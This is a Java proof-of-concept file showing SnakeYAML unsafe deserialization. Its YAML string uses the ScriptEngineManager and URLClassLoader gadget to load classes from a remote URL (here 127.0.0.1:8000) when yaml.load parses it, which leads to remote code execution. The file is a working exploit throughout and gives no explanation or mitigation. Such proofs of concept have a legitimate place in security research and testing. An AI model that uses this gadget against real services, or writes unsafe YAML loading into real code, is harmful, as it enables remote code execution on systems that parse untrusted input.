package com.SugarP1g.deserialization.Yaml.ScriptEngineManager;

import org.yaml.snakeyaml.Yaml;

public class POC {
    public static void main(String[] args) {
        // String normal = "key: hello yaml";
         String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                 + "[[!!java.net.URL [\"http://127.0.0.1:8000/\"]]]]";
//        String malicious = args[1];
        Yaml yaml = new Yaml();
        Object obj = yaml.load(malicious);
        System.out.print(obj);
    }
}
